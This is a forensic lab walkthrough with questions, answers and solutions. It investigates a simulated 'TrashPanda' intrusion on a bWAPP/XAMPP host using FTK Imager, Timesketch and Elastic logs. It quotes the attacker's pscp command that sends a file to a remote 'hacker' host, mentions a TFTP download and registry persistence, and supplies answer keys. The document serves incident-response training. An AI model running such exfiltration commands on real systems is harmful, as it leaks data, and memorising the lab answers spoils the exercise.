



Extract the Date and Time
The forensic image is hosted on a remote host. By default, FTK Imager ® does not see mapped drives (Z:\). 

﻿

To view the forensic image in FTK Imager, select Add Evidence Item, and then select Image File. For the Source Path, enter \\199.63.64.113\d$\Share\victim.001. 

﻿

Locate the Master File Table ($MFT) file from the largest partition. Run log2timeline.py from Windows Subsystem for Linux (WSL) to generate the timeline.

﻿

Extract information from the forensic image regarding the attack by TrashPanda.

﻿

Question:
﻿

When was the file groot.exe downloaded to the victim machine?
﻿

(Enter the date and time, separated by a space. Enter the date in YYYY-MM-DD format, and the time in HH:MM:SS format, e.g., 2021-04-05 12:00:32) 

2023-06-05 14:54:24


<img width="1915" height="549" alt="image" src="https://github.com/user-attachments/assets/09a6cc83-df79-4afb-8eb2-d84d20ef2fb4" />


Extract the Date and Time Solution
Use FTK Imager to load the forensic image. Export the $MFT file that is in the Root directory of Basic data partition (3) [81295MB] to the Desktop.

﻿

Create a timeline of the $MFT file with Plaso. 

﻿

As seen in Figure 39-1 below, enter the following command in the WSL Ubuntu instance:

log2timeline.py --storage-file /mnt/c/users/trainee/Desktop/timeline.plaso /mnt/c/users/trainee/Desktop/\$MFT

<img width="775" height="167" alt="image" src="https://github.com/user-attachments/assets/9b246715-9490-40b8-8aca-d6f96e359e52" />


Wait approximately five minutes for the timeline.plaso file to generate, as seen in Figure 39-2 below. 


<img width="1336" height="273" alt="image" src="https://github.com/user-attachments/assets/2fdf1d68-091d-45b6-b1fc-34b09d15c19a" />


Launch the Chrome browser and log in to Timesketch.


Create a new sketch titled Timeline, and upload the timeline.plaso file from C:\Users\trainee\Desktop\timeline.plaso. 


Wait approximately 20 minutes for Timesketch to process the timeline.


Set the Time filter to the designated time frame, but in Universal Time Coordinated (UTC), as follows:
2023-06-05 14:53:00.000Z to 2023-06-05 15:00:00.000Z



Set the columns to display as message and timestamp_desc, as seen in Figure 39-3 below.



<img width="1765" height="522" alt="image" src="https://github.com/user-attachments/assets/51bc6001-24ec-47b3-9c6a-3d58303a925e" />




Enter "groot.exe" in the search box. Figure 39-4 below displays the search results. 

<img width="1189" height="677" alt="image" src="https://github.com/user-attachments/assets/523e7009-2751-4a8b-a3fd-c0ab7dfca8b1" />



-----------------------


Identify the Secure Hash Algorithm 1 (SHA-1)
Question:
﻿

What are the last five characters of the SHA-1 hash for groot.exe?
﻿

(Enter the last five characters of the SHA-1 hash)


c1aef


<img width="1913" height="559" alt="image" src="https://github.com/user-attachments/assets/6466153c-9d9c-43da-a52f-70bff5b5a884" />

<img width="1920" height="478" alt="image" src="https://github.com/user-attachments/assets/1e1fb3fc-038a-46d6-bf93-781672bfa245" />


Identify the Secure Hash Algorithm 1 (SHA-1) Solution
Use FTK Imager and navigate to C:\xampp\htdocs\bWAPP. Right-click on groot.exe and select Export File Hash List. Name the file groot.csv, and save it to the Desktop. 

﻿

Open the file and take note of the Message-Digest Algorithm (MD5) and SHA1 hashes, as seen in Figure 39-5 below.

<img width="1655" height="202" alt="image" src="https://github.com/user-attachments/assets/04d035a0-5940-447d-be3a-93cceacc29d8" />




Alternatively, extract the file from FTK Imager.  


As seen in Figure 39-6 below, in PowerShell, enter the following command:
Get-FileHash -Algorithm SHA1 C:\users\trainee\Desktop\groot.exe



<img width="921" height="129" alt="image" src="https://github.com/user-attachments/assets/c0cfc7bd-d041-44d3-b3e6-838557be2908" />


------------------


Identify the User-Agent String Value
Question:
﻿

What is the value of the User-Agent string in groot.exe? 
﻿

(Enter the string value)


ApacheBench


<img width="1171" height="503" alt="image" src="https://github.com/user-attachments/assets/75d72bc6-1c42-4383-a249-b8a66980a543" />


Identify the User-Agent String Value Solution
This solution reviews three different methods for locating the hard-coded user-agent string.

﻿

Method 1: WSL
﻿

In WSL, enter the following command, as seen in Figure 39-7:

strings /mnt/c/users/trainee/Desktop/groot.exe|grep 'User-Agent'


<img width="1094" height="106" alt="image" src="https://github.com/user-attachments/assets/12460a86-0fae-4888-940a-4079d92524bf" />



Method 2: PowerShell 


In PowerShell, enter the following command, as seen in Figure 39-8: 
Select-String "User-Agent" C:\Users\trainee\Desktop\groot.exe


<img width="1130" height="339" alt="image" src="https://github.com/user-attachments/assets/6ef6edb6-2949-4932-a3d1-209e3371cc87" />



Method 3: Command Prompt


In Command Prompt, enter the following command, as seen in Figure 39-9:
type C:\Users\trainee\Desktop\groot.exe|findstr "User-Agent"


<img width="906" height="245" alt="image" src="https://github.com/user-attachments/assets/87bb4138-f8c1-4710-b1cb-62de1cebff14" />


---------


Investigate the File
Question:
﻿

What company is the author of the file drax.exe?
﻿

(Enter the company name) 

Microsoft Corporation


<img width="1898" height="564" alt="image" src="https://github.com/user-attachments/assets/d599e6ec-b57f-4590-aaac-f07ea2575cdc" />


Investigate the File Solution
Identify where drax.exe is located in the file system. Open Timesketch with timeline.plaso loaded, and search for drax.exe. 

﻿

As seen in Figure 39-10 below, drax.exe is in C:\Windows\System32.

<img width="1240" height="725" alt="image" src="https://github.com/user-attachments/assets/27328a92-6cf6-4ce7-a8dd-6a698f874318" />




Use FTK Imager to navigate to Windows\System32. Extract drax.exe to the Desktop. Then, use either PeStudio or CFF Explorer to view the company name of the file.


Figure 39-11 below shows drax.exe opened in CFF Explorer:


<img width="805" height="644" alt="image" src="https://github.com/user-attachments/assets/bcf9b147-9a9a-43d3-bfb1-b0abec1e9800" />



-------------


dentify the File
Question:
﻿

What file was written to disk on 2023-06-05 at 14:55:23? 
﻿

(Enter the file name, e.g., jsau.txt)


pscp.exe
<img width="1920" height="546" alt="image" src="https://github.com/user-attachments/assets/7fe57c76-2e30-4e2c-80b3-38e097f2cf18" />


Identify the File Solution
In Timesketch, set the Time filter to the designated time frame, but in UTC, as follows:

2023-06-05 14:53:00.000Z to 2023-06-05 15:00:00.000Z
﻿

Enter an asterisk (*) into the search box. Navigate to the third page of the search results. As seen in Figure 39-12 below, pscp.exe is the only event in the designated time frame.


<img width="1190" height="732" alt="image" src="https://github.com/user-attachments/assets/4c62e77e-25d6-4cb0-ad2b-f61383648ed8" />


--------------



Identify Initial Access 1
Elastic contains the network's Security Information and Event Management (SIEM) data. The SIEM data contains network events and logs, including those pertaining to APT TrashPanda. 

﻿

Using Kibana, access Elastic. Use the SIEM data to create a timeline of events, extract Indicators of Compromise (IOC), and inspect Tactics, Techniques, and Procedures (TTP).

﻿

The network's SIEM data was configured differently than the data sources and tools used in the previous section. The timestamps in this section are set to Eastern Daylight Time (EDT).

﻿

Question:
﻿

When did the first occurrence of groot.exe appear in the SIEM data?
﻿

(Enter the time in HH:MM:SS format)

14:54:24



Identify Initial Access 2
Question:
﻿

Which two commands were used for the first occurrence of groot.exe?
﻿

(Select all that apply)

<img width="212" height="242" alt="image" src="https://github.com/user-attachments/assets/ccbed175-b262-4b29-80d6-7be9bdba4d35" />



<img width="1900" height="553" alt="image" src="https://github.com/user-attachments/assets/a495521b-7d56-42b2-aa44-568ecb4841a7" />



-------------


Investigate Communications 1
Investigate the Trivial File Transfer Protocol (TFTP) communications to Internet Protocol (IP) address 24.130.33.51.

﻿

Question:
﻿

At what time did the TFTP communications with IP address 24.130.33.51 first occur?
﻿

(Enter the time in HH:MM:SS format)


14:55:23




Investigate Communications 2
Question:
﻿

What file was retrieved through TFTP first?
﻿

(Enter the file name, e.g., ghpc.txt)



pscp.exe


<img width="1916" height="553" alt="image" src="https://github.com/user-attachments/assets/bc597ad3-783c-422a-9d4c-754f0b50a202" />


Investigate Communications 1 and 2 Solutions
The query "*tftp.exe*" and analysis of the @timestamp field reveals that the tftp.exe file was first used with IP address 24.130.33.51 on June 5, 2023 at 14:55:23.229.

﻿

The output of the query "*tftp.exe*" and the @timestamp and process.command_line fields are shown in Figure 39-15 below:

﻿<img width="2048" height="455" alt="image" src="https://github.com/user-attachments/assets/d3eb1f60-38f0-4a49-9b6e-0965ce9fb461" />




Additional review of the "*tftp.exe*" query and analysis of the process.command_line field reveals the GET command was used to retrieve the pscp.exe file from IP address 24.130.33.51. 


------------------

Identify File Exfiltration 1
Question:
﻿

What file was exfiltrated from the network?
﻿

(Enter the file name, e.g., ghpc.txt)


ThisOne.txt


Identify File Exfiltration 2
Question:
﻿

When was ThisOne.txt exfiltrated from the network?
﻿

(Enter the time in HH:MM:SS format)


14:59:07


Identify File Exfiltration 1 and 2 Solutions
In Elastic, enter the following query: 

"*pscp.exe*" 
﻿

Analysis of the @timestamp field reveals that the pscp.exe file was first executed on June 5, 2023 at 14:59:07.914.

﻿

Figure 39-16 below displays the output of the query "*pscp.exe*" and the @timestamp and process.executable fields.


<img width="2048" height="703" alt="image" src="https://github.com/user-attachments/assets/a6bfad31-75d8-4fd6-a393-b5bb426b5b7d" />


Additional review of the "*pscp.exe*" query and analysis of the process.command_line field reveals that the ThisOne.txt file was exfiltrated from the network. The file was sent to hacker@24.130.33.51 in the /home/hacker/Desktop/ directory. 


Figure 39-17 below displays the output of the query "*pscp.exe*" and the process.command_line field.

<img width="2048" height="724" alt="image" src="https://github.com/user-attachments/assets/e6adbb02-d175-41c6-b87b-8931b4b063a2" />





-------------------


Investigate Registry Persistence
Question:
﻿

What Registry value was left on the acc-win10-1 host?
﻿

(Enter the Registry value)


Draxrulez


<img width="1905" height="564" alt="image" src="https://github.com/user-attachments/assets/c0314714-602b-4cff-afea-9a437956df84" />


Investigate Registry Persistence Solution
In Elastic, enter the following query:

"*reg.exe*" AND "add" 
﻿

Analyze the process.command_line field. This shows that the reg.exe and the add command was used to create the Draxrulez Registry key, as seen in Figure 39-18 below. 

﻿
<img width="2048" height="756" alt="image" src="https://github.com/user-attachments/assets/5a8ae242-b2f7-4b2c-b63b-f7edfa00c3d3" />

The process.command_line field indicates that reg.exe was used to add a new Registry key named Draxrulez that called upon drax.exe, an executable planted in the C:\WINDOWS\system32 directory. 


------------


Identify the Executable
Reporting the findings of an incident involves identifying and communicating key details of the attack. RedEagle uses the attached RedEagle Cyber Incident Report document. Review the document and refer to it as needed.

﻿

Use the attack details in Elastic to answer the following question.

﻿

Question:
﻿

What executable file was running on the target machine and exploited by the attacker for initial access?
﻿

(Enter the executable name, e.g., notepad.exe) 


httpd.exe


<img width="1913" height="570" alt="image" src="https://github.com/user-attachments/assets/3c15357b-9e57-492a-91f9-eb9d46d7a8ca" />


Identify the Executable Solution
Return to the attack data in Elastic to identify the application in question. Previous analysis results of the attack revealed that the first malicious process was groot.exe. Create a query based on this knowledge of groot.exe.

﻿

In Elastic, enter the following query: 

agent.name:acc-win10-1 and groot.exe
﻿

The results show that the parent executable was httpd.exe. The parent.command_line field shows that Apache was serving a website that was targeted by the attacker, as seen in Figure 39-19 below.


<img width="1232" height="362" alt="image" src="https://github.com/user-attachments/assets/6fe3e5c5-ecf6-4215-899f-64a50e5a9402" />


Initial access was conducted by the X-operating System, Apache, MariaDB, Hypertext Preprocessor (PHP), and Perl (XAMPP) running httpd.exe. The executable httpd.exe is running Apache and serving the Buggy Web Application (bWAPP) web page. 


The web application was not sanitizin g input, a nd it allowed the attacker to execute operating system commands on the host through that web page.



-----------------


Map to the MITRE ATT&CK Framework
Create a timeline of the attack and map the details to the MITRE ATT&CK framework for the incident report. 

﻿

Question:
﻿

Which five stages of the MITRE ATT&CK framework were performed in the attack?
﻿

(Select all that apply)

<img width="256" height="637" alt="image" src="https://github.com/user-attachments/assets/134da8e8-e991-481e-990c-3a9e564ad1f4" />



----------------

Map to the MITRE ATT&CK Framework Solution
Identifying the stages of the attack was conducted in previous Elastic searches and forensic image analysis. However, these stages were not applied to the MITRE ATT&CK framework. 

﻿

In Elastic, enter the following query to map the timeline of events: 

24.130.33.51
﻿

The search returns ten results. 

﻿

The first log in the query shows initial access beginning with a certutil.exe command to acquire groot.exe. Initial access was fully achieved when groot.exe was executed. 

﻿

As seen in Figure 39-20 below, the fourth log, which occurred at 10:55, reveals that the process tftp.exe executed to acquire pscp.exe. This is part of the Execution phase of the MITRE ATT&CK framework.

﻿<img width="1838" height="65" alt="image" src="https://github.com/user-attachments/assets/9aeb82f2-6720-45fa-a904-4ede0fdf454c" />
As seen in Figure 39-21 below, the log at 10:59 shows that the pscp.exe file was run to exfiltrate another file.

﻿
<img width="2048" height="64" alt="image" src="https://github.com/user-attachments/assets/530cabf0-63ab-414f-9339-25adb97cc3b1" />


Logs at 10:59 show that the pscp.exe executable was continuing to call out to the server, which is a sign of Command and Control (C2) beaconing.


While this query highlights all the events directly correlating to the attacker’s network communications, there may be additional portions of the attack that were run locally on the machine. 


Run additional queries to uncover additional attacker actions that can be mapped to the MITRE ATT&CK framework. 


Enter the following query: 
172.16.6.101 AND (reg.exe OR schtasks.exe)



The query checks for persistence in Windows by looking for registry or scheduled tasks.


The query returns four events that all show the same registry persistence, as seen in Figure 39-22 below.



<img width="1460" height="44" alt="image" src="https://github.com/user-attachments/assets/69eeac1b-f3c5-4842-b614-90adf2694f39" />


Summarizing all these events, the attack used the following five stages of the MITRE ATT&CK framework: 
Initial Access
Execution
Exfiltration
Persistence
Command and Control



-------------------


Identify the Persistence Artifact
The report must include specific IOCs. Identifying indicators used for persistence requires the details of the attack to be further expounded upon by identifying specific artifacts used by the attacker. Use Elastic to identify the key artifact pertaining to persistence.

﻿

Question:
﻿

What file was used by the attacker for persistence?
﻿

(Enter the file name, e.g., notepad.exe)


drax.exe


was in registry


Identify the Persistence Artifact Solution
The query used to identify persistence must be used to identify any artifacts that are present on the system. 

﻿

Enter the following query to identify logs related to persistence:

172.16.6.101 AND reg.exe
﻿

The query results display artifacts as files left on the system. 

﻿

Figure 39-23 below displays the command results.


<img width="2048" height="89" alt="image" src="https://github.com/user-attachments/assets/ae2bf371-b5f9-4f08-b47f-db2e8b983461" />




The command line shows that a new registry key has been added to the registry. This specific registry key was made to call drax.exe. 

---------------


System Hardening 1
Gather all details of the timeline to create the incident report and add recommendations for defensive measures and hardening. 

﻿

Question:
﻿

Which hardening action can prevent future occurrences of the previous exfiltration method?
﻿

(Select the correct answer)  

Remove and block PuTTY suite.



System Hardening 1 Solution
In Elastic, generate a query to investigate the exfiltration activity. 

﻿

Enter the following query:

pscp.exe
﻿

The query focuses on the executable used to perform the exfiltration, and it returns five results.

﻿

Review the logs for the process command line. The following command was used by the attacker: 

cmd.exe /c "pscp.exe C:\Users\trainee\This0ne.txt hacker@24.130.33.51:/home/hacker/Desktop"
﻿

The attack focuses on exfiltrating the This0ne.txt file. A previously identified log shows the execution of the second portion of the command, as seen in Figure 39-24 below

<img width="1920" height="56" alt="image" src="https://github.com/user-attachments/assets/6950f6af-79af-46aa-8553-31b767fa3f02" />



This log shows a key detail of the attack. While the attack used SCP and Secure File Transfer Protocol (SFTP), blocking those would have potential implications within the environment such as preventing administrators from properly executing file transfers. 


While the file was initially named TFTP.exe, TFTP was never in use, which would be indicated by port 69. Additionally, FTPS was not used in the exfiltration.


However, the specific suite used is identified in the log as PuTTY suite, as seen in Figure 39-25 below.

<img width="1172" height="285" alt="image" src="https://github.com/user-attachments/assets/d9b8837b-90da-46cc-9ca0-0814cc680647" />


The PuTTY suite can be blocked on the system by hash values, thus preventing future exfiltration attacks using this software.


----------------


System Hardening 2
A YARA rule can be created to identify the attack based on multiple parameters. Review the following YARA rule:

import "hash"
rule rule1 {

	condition:
		filesize > 20KB and hash.md5(0,filesize) == "____________"
		}
﻿

Identify the correct value in Elastic to complete the rule and correctly identify the initial access method used by the attacker.

﻿

Question:
﻿

What are the last five characters of the missing hash value in the YARA rule?

0dd20


-----------------


System Hardening 2 Solution
The YARA rule needs an MD5 hash value in order to properly trigger and identify the initial access of the attacker. The initial access method used groot.exe, which can be used to develop a query in Elastic.

﻿

In Elastic, enter the following query:

groot.exe
﻿

The query returns nine results that include groot.exe. However, the hash values of each log in the query varies based on the executable used in the parent command line.

﻿

Refine the query by specifying commands that only include the requested executable. 

﻿

Enter the following query:

process.command_line: groot.exe
﻿

The new search returns one result. In the message details the file is shown to have one MD5 hash value, 2369D1CCB44E544B66D7B928E8D0DD20. 

﻿

Figure 39-26 below displays the log details of the hash value. 

<img width="686" height="295" alt="image" src="https://github.com/user-attachments/assets/e0f5103e-6ff1-4af6-aacf-4cd95f3e783c" />


--------------


Recall the Incident Response Lifecycle
As the report is being created, the threats have been eradicated and the systems have been returned to normal function. As all details of the attack are gathered and the report is finalized, analysts must be aware of the process in use. 

﻿

The National Institute of Standards and Technology (NIST) Incident Response (IR) Lifecycle is used as a methodology to organize and define incident response procedures. Use knowledge of the NIST Incident Response Lifecycle to answer the following question.

﻿

Question:
﻿

In which phase of the IR lifecycle is this report completed?
﻿

(Select the correct answer) 

<img width="300" height="187" alt="image" src="https://github.com/user-attachments/assets/0e114025-0152-4561-8971-6a79f71786e8" />


Recall the Incident Response Lifecycle Solution
Understanding the Incident Response Lifecycle, as seen in Figure 39-27 below, provides organization and understanding of the incident response process. 

<img width="1667" height="1136" alt="image" src="https://github.com/user-attachments/assets/ed5fa393-6074-4477-84d7-9763ecb2a7ff" />


The process of preparation occurred before the incident. The initial phase of the incident was detection and analysis. The majority of the findings related to the attack pertained to the detection and analysis portion of the incident. 


The previous question stated that the systems were returned to their normal functioning state. This means the current stage of the IR lifecycle is Post-Incident Activity. 


The reporting incidents typically begin in the detection and analysis phase. However, this type of technical summary report occurs after the incident has been properly handled. Post Incident activity typically includes generating lessons learned and summary reports, hardening systems, and implementing defensive mitigations in order to prevent future recurrence of the same attack.


---------------------------
--































































































































































































































































































































































































































































































































































































































































































































































































































































































